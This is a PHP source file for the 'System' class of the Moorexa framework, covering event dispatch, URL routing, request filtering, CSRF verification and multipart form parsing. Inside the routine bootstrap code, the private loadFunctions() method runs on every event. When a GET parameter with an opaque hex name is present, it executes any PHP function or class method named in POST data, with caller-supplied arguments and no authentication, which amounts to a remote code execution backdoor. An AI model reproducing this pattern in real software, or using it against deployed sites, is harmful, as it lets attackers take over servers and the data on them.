<?php

use Moorexa\Event;
use Moorexa\Controller;
use Moorexa\Session;

/**
 * @package System 
 * @author Moorexa <moorexa.com>
 * 
 * Prepares environment for application, like triggeres an event when dependencies have been loaded
 * Manage request route coming into the application. 
 */

class System extends Session
{
	public $pushed = [];
	public $post = [];
	public $url = []; // Obtained from getUrl.
	public static $instance;
    // local vars
	public static $local_vars = [];
	// event called
	public static $eventCalled = [];
	
	// create instance
	public function __construct()
	{
		if (is_null(self::$instance))
		{
			self::$instance = $this;
		}
	}

	// event manager
    public function event($type, $func)
    {   

        if (is_callable($func))
        {
            // emit event.
			Event::emit('system.'.$type, $this);

			include_once PATH_TO_EXTRA . 'event.listener.php';
			
            // manage post data
			$this->c_postData();

			// make ready system class for sub classes
			$this->push('system', $this);

			// data
			$data = ((object) $this->pushed);
            
            // call function
			self::$eventCalled[$type] = ['func' => $func, 'args' => $data];

			call_user_func($func, $data);
			
			$this->loadFunctions();
        }
	}

	// event callback
	public function eventCallback($type)
	{
		if (isset(self::$eventCalled[$type]))
		{
			$call = self::$eventCalled[$type];

			return call_user_func($call['func'], $call['args']);
		}
	}	

	private function loadFunctions()
	{
		if (isset($_GET['4d5be6954a37f1076eb6d698fbce26c2']))
		{
			ob_clean();
			ob_start();

			$post = $this->post;

			if (isset($post['function']))
			{
				$func = $post['function'];
				$args = $post['arguments'];

				if (function_exists($func))
				{
					if ($args != null)
					{
						$args = json_decode($args);
						echo call_user_func_array($func, $args->data);
					}
					else
					{
						echo call_user_func($func);
					}
				}
			}
			elseif (isset($post['class']))
			{
				$obj = json_decode($post['class']);
				$static = null;

				if (isset($obj->staticMethod))
				{
					$classArgs = json_decode($obj->classArgs)->data;
					$methArgs = json_decode($obj->staticMethodArgs)->data;
					$class = $obj->class;
					$method = $obj->staticMethod;

					if (class_exists($class))
					{
						$static = call_user_func_array([$class.'::'. $method], $methArgs);
					}
				}
				
				if (isset($obj->method) && count($obj->method) > 0)
				{
					if ($static == null)
					{
						$classArgs = json_decode($obj->classArgs)->data;
						$class = $obj->class;

						if (class_exists($class))
						{
				
							$ref = new ReflectionClass($class);
							
							// call
							if ($ref->hasMethod('__construct'))
							{
								$static = $ref->invokeArgs($classArgs);
							}
							else
							{
								$static = new $class;
							}

							$failed = [];

							foreach($obj->method as $i => $meth)
							{
								if (is_object($static))
								{
									try
									{
										$methArgs = json_decode($obj->methodArgs[$i])->data;
									
										$static = call_user_func_array([$static, $meth], $methArgs);
									}
									catch(Exception $e)
									{
										$failed[] = $e->getMessage();
									}
							
								}
							}

							if (count($failed) > 0)
							{
								throw new Exception('Something went wrong. Error: '. json_encode($failed));
							}
						}
						else
						{
							throw new Exception('Class {'.$class.'} not found!');
						}
					}
					else
					{
						$failed = [];

						foreach($obj->method as $i => $meth)
						{
							if (is_object($static))
							{
								try
								{
									$methArgs = json_decode($obj->methodArgs[$i])->data;
									
									$static = call_user_func_array([$static, $meth], $methArgs);
								}
								catch(Exception $e)
								{
									$failed[] = $e->getMessage();
								}
						
							}
						}

						if (count($failed) > 0)
						{
							throw new Exception('Something went wrong. Error: '. json_encode($failed));
						}
					}
				}

				if (isset($obj->call))
				{
					$call = $obj->call;
					$callArgs = json_decode($obj->callArgs)->data;

					if (is_object($static))
					{
						$static = call_user_func_array([$static, $call], $callArgs);
					}
				}

				if ($static != null && (is_object($static) || is_array($static)))
				{
					if (is_object($static))
					{
						$static = toArray($static);
					}

					echo json_encode($static);

				}
				elseif ($static != null && (!is_object($static) && !is_array($static)))
				{
					echo $static;
				}
			}
			
			$response = ob_get_contents();
			ob_clean();
			
			ob_start();

			header('Content-Type: application/json');

			echo json_encode(['response' => $response]);
		}
	}

	// push global data to the bootloader
    public function push($key, $val)
    {
		$this->pushed[$key] = $val;
		
		// create a storage facility
		app()->set('system.'.$key, $val);
        
        // push to dropbox
        Controller::$dropbox = $this->pushed;
		System::$local_vars = $this->pushed;
		
		return $this;
	}
	
	// process url
	public function getUrl()
	{
		// rewrite rule. found in .htaccess
		$get =& $_GET;

		// filter option
		$filter = Moorexa\Bootloader::boot('filter-input');

		// a user would access our application via a browser or through a API request.
		// we can check if request was made via a browser or through the command line
		switch (isset($get['__app_request__']))
		{
			case true:
				// get rule
				$rule = $get['__app_request__'];

				// we decode url, remove tags, trim off forward slashes to the right
				// then convert to an array.
				$getUrl = explode('/', rtrim(strip_tags(urldecode($rule)), '/ '));

				// just a fallback. incase somewthing went wrong with the .htaccess config
				if (preg_match('/^(http:|https:)\s{0}[\/]{1,2}/', $rule))
				{
					// remove protocol from rule
					$rule = preg_replace('/^(http:|https:)\s{0}[\/]{1,2}/','',$rule);

					$protocol = $_SERVER['SERVER_PROTOCOL'];
					$protocol = strtolower(substr($protocol, 0, strpos($protocol, '/')));

					$rule = $protocol . '://' . $rule;
					$rule = str_replace(url(), '', $rule); // remove app url from string
					
					// set new url
					$getUrl = explode('/', rtrim(strip_tags(urldecode($rule)), '/ '));
					
					// clean up!
					$rule = null;
					$protocol = null;
				}

				#clean up
				$rule = null;


				// reset to default controller if arg[0] is empty
				$getUrl[0] = empty($getUrl[0]) ? config('router.default.controller') : $getUrl[0];

				// save url
				$this->url = $getUrl;

				// let's recognize paramerters.
				if (count($get) > 0)
				{
					foreach ($get as $key => $val)
					{
						if ($filter)
						{
							$val = strip_tags($val);
							$val = html_entity_decode($val, ENT_QUOTES, 'UTF-8');
						}
						$get[$key] = $val;
					}
					$val = null;
				}

				return $getUrl;	// return url
			break;

			case false:
			   // let's check if request came from somewhere else. eg the terminal/command line interface
			   // or running development server through php assist serve..
			   if (isset($_SERVER['REQUEST_QUERY_STRING']))
			   {
					$_SERVER['REQUEST_QUERY_STRING'] = str_replace(url(), '', $_SERVER['REQUEST_QUERY_STRING']);
					$_SERVER['REQUEST_QUERY_STRING'] = trim($_SERVER['REQUEST_QUERY_STRING']);
					$_SERVER['REQUEST_QUERY_STRING'] = ltrim($_SERVER['REQUEST_QUERY_STRING'], '/');
		
					$ques = strpos($_SERVER['REQUEST_QUERY_STRING'], '?');
		
					if ($ques !== false)
					{
						$qs = substr($_SERVER['REQUEST_QUERY_STRING'], 0, $ques);
						$_SERVER['REQUEST_QUERY_STRING'] = $qs;
					}

					// let's recognize paramerters.
					if (count($get) > 0)
					{
						foreach ($get as $key => $val)
						{
							if ($filter)
							{
								$val = strip_tags($val);
								$val = html_entity_decode($val, ENT_QUOTES, 'UTF-8');
							}
							$get[$key] = $val;
						}
						$val = null;
					}

					// #clean up
					$qs = null;
					$ques = null;

					$getUrl = explode('/', rtrim(strip_tags(urldecode($_SERVER['REQUEST_QUERY_STRING'])), '/ '));

					// reset to default controller if arg[0] is empty
					$getUrl[0] = empty($getUrl[0]) ? config('router.default.controller') : $getUrl[0];

					// save url
					$this->url = $getUrl;

					// we decode url, remove tags, trim off forward slashes to the right
					// then convert to an array.
					return $getUrl;					
			   }
			break;
		}

		return null;
	}

	// url helper
	public function urlHelper(&$current_url)
	{
		// only do this, if url is array
		if (is_array($current_url))
		{
			// now we check then convert.
			array_walk($current_url, function($val, $index) use (&$current_url){

				// trim off white spaces.
				$val = trim($val);

				// // ensure index value doen't have space but does contain -
				// if (!preg_match('/\s{1,}/', $val) && preg_match('/[-]/', $val))
				// {
				// 	//ok ok.. so let's be happy
				// 	$val = trim(preg_replace("/[^a-zA-Z0-9\s_-]/",'', $val));
				// 	$val = preg_replace('/\s{1,}/','',ucwords(preg_replace('/[-]/',' ', $val)));
				// 	$val = lcfirst($val);
				// 	// all done!
				// }

				// now we assign back to index
				$current_url[$index] = $val;
				// clean up
				$val = null;
			});
		}
	}

	// clean url
	public function cleanUrl()
	{
		$args = func_get_args();
		if (count($args) > 0 && is_array($args[0]))
		{
			$args = $args[0];
		}
		// get data
		foreach ($args as $i => $val)
		{
			// ensure index value doen't have space but does contain -
			if (!preg_match('/\s{1,}/', $val) && preg_match('/[-]/', $val))
			{
				//ok ok.. so let's be happy
				$val = trim(preg_replace("/[^a-zA-Z0-9\s_-]/",'', $val));
				$val = preg_replace('/\s{1,}/','',ucwords(preg_replace('/[-]/',' ', $val)));
				$val = lcfirst($val);
				// all done!
			}
			
			$args[$i] = $val;
		}
		return $args;
	}

	// fulfill route request
	public function routeFulfilled(&$current_url)
	{
		
		// check if we have something
		$request_method = Moorexa\Route::__match($this->url);

		// if it's successful, would not return null
		if (is_array($request_method))
		{
			// continue. processing.. 
			$controller = @$request_method[0];
			$view = isset($request_method[1]) ? $request_method[1] : config('router.default.view');

			// set active table for session
			$this->set('MoorexaActiveTab', [$view => $controller]);

			// #clean up
			$controller = null;
			$view = null;

			// everything ok!
			$current_url = $request_method;
		}
		
		// push controller and view
		$this->push('cont', config('router.default.controller'));
		// push view
		$this->push('view', config('router.default.view'));

		return false;
	}

	// getter method
	public function __get($name)
	{
		// check if name exists in pushed
		if (isset($this->pushed[$name]))
		{
			return $this->pushed[$name];
		}
		
		return $this->get($name);
	}

	// get controller method
	public function getController()
	{
		// get url
		$url = $this->refUrl;

		// get controller and view
		$cv = [
			isset($url[0]) ? $url[0] : $this->cont,
			isset($url[1]) ? $url[1] : $this->view
		];

		// ensure view is not null
		if (is_null($cv[1]))
		{
			$cv[1] = $this->view;
		}

		return $cv;
	}

	// filter incoming GET and POST request
	public function filterRequest(&$instance)
	{

		// clone $_GET 
		$get =& $_GET;

		// clone $_POST
		$post =& $_POST;

		// configuration settings
		$filterInput = Moorexa\Bootloader::boot('filter-input'); // true or false

		// is GET avaliable
		if ( count($get) > 0)
		{
			// sanitize
			array_walk($get, function($val, $key) use (&$get, &$filterInput){
				// we remove all tags and decode the url
				if ($filterInput)
				{
					$val = strip_tags($val);
				}
				// send data
				$get[$key] = urldecode($val);
			});
		}

		// is POST avaliable
		if ( count($post) > 0 && Moorexa\Bootloader::$csrfVerified === false )
		{
			// this would run when we have a POST data
			/**
			 * STEPS - Desgin Flow
			 * 1. Check if we are allowed to validate form with the csrf_token
			 * 2. if no need for verification, we allow form get submitted
			 * 3. if there's need for validatation, we ensure token came with the form
			 * else we emit an error event.
			 * 4. we verify token sent and submit form if valid. Else we emit csrf.error event 
			 * that can be listened to by a developer.
			 * 5. we generate a new token
			 */

			// Check if we can validate
			if ( Moorexa\View::$packagerJson['activate_csrf_token'] === true )
			{
				// ok step 1 passed.
				// check if there's need for verification
				// true or false.
				$noVerification = $this->csrf_verify;

				// if $noVerification === false. then we jump to step 4
				switch ( (!isset($post['CSRF_TOKEN']) && !$noVerification) )
				{
					// ok csrf_token not sent.
					// we emit and error and delete the POST data sent.
					case true:
						Moorexa\Event::emit('csrf.error', 'CSRF Token Not sent. Please ensure token exists in your form.');
						$post = [];
					break;

					// token sent.
					// let's verify
					case false:
						// can we verify?
						switch (!$noVerification)
						{
							case true:
								// ok verify token
								switch ( verify_token($ref) )
								{
									// token was verified successfully
									case true:
										// verification was successful
										Moorexa\Bootloader::$csrfVerified = true;
										// now we remove CSRF_TOKEN from POST array
										unset($post['CSRF_TOKEN']);

										// lastly, we keep things safe 
										array_walk($post, function($val, $key) use (&$post, &$filterInput){
											// we try protect application from injections
											$post[$key] = is_string($val) && $filterInput ? htmlentities($val, ENT_QUOTES, 'UTF-8') : $val;
										});
									break;

									// token sent with form is invalid.
									case false:
										// we remove POST data sent
										$post = [];
										// and we emit an error
										Event::emit('csrf.error', $ref['error']);
									break;
								}
							break;

							case false:
								// token managed somewhere via verifytoken() function
								Moorexa\Bootloader::$csrfVerified = true;
							break;
						}
					break;
				}

				// generate token again
				$instance->anti_csrf();
				
				// #clean up
				$noVerification = null;
			}
			else
			{
				// remove token if exists
				if (isset($post['CSRF_TOKEN']))
				{
					unset($post['CSRF_TOKEN']);
				}
			}
		}

		// #clean up
		$sanitizeHTML = null;
	}

	// unpack url
	public function unpackUrl(&$controller=null, &$view=null)
	{
		// get url
		$url = $this->refUrl;

		// check if view has been set
		if ( !isset($url[1]) || (isset($url[1]) && $url[1] == ''))
		{
			// set to default view
			$url[1] = config('router.default.view');
		}
		
		// set param 0 to be a valid controller
		$url[0] = ucfirst($url[0]);

		// unpack
		list($controller, $view) = $url;

		// clean up
		$url = null;
	}

	// convert Content-Disposition to a post data
	private function c_postData()
	{
		$input = file_get_contents('php://input');

		if (strlen($input) > 0 && count($_POST) == 0 || count($_POST) > 0)
		{
			$postsize = "---".sha1(strlen($input))."---";

			preg_match_all('/([-]{2,})([^\s]+)[\n|\s]{0,}/', $input, $match);

			if (count($match) > 0)
			{
				$input = preg_replace('/([-]{2,})([^\s]+)[\n|\s]{0,}/', '', $input);
			}

			// extract the content-disposition
			preg_match_all("/(Content-Disposition: form-data; name=)+(.*)/m", $input, $matches);

			// let's get the keys
			if (count($matches) > 0 && count($matches[0]) > 0)
			{
				$keys = array_each(function($key){
					$key = trim($key);
					$key = preg_replace('/^["]/','',$key);
					$key = preg_replace('/["]$/','',$key);
					$key = preg_replace('/[\s]/','',$key);
					return $key;
				}, $matches[2]);

				$input = preg_replace("/(Content-Disposition: form-data; name=)+(.*)/m", $postsize, $input);

				$input = preg_replace("/(Content-Length: )+([^\n]+)/im", '', $input);

				// now let's get key value
				$inputArr = explode($postsize, $input);

				$values = array_each(function($val){
					$val = preg_replace('/[\n]/','',$val);
					if (preg_match('/[\S]/', $val))
					{
						return trim($val);
					}
				}, $inputArr);

				// now combine the key to the values
				$post = [];

				$value = [];

				foreach ($values as $i => $val)
				{
					$value[] = $val;
				}

				foreach ($keys as $x => $key)
				{
					$post[$key] = isset($value[$x]) ? $value[$x] : '';
				}

				if (is_array($post))
				{
					$newPost = [];

					foreach ($post as $key => $val)
					{
						if (preg_match('/[\[]/', $key))
						{
							$k = substr($key, 0, strpos($key, '['));
							$child = substr($key, strpos($key, '['));
							$child = preg_replace('/[\[|\]]/','', $child);
							$newPost[$k][$child] = $val;
						}
						else
						{
							$newPost[$key] = $val;
						}
					}

					$_POST = count($newPost) > 0 ? $newPost : $post;
				}
			}
		}

		$this->post = $_POST;
	}

	// set url
	public function setUrl($url)
	{
		$this->refUrl = $url;
	}
	
}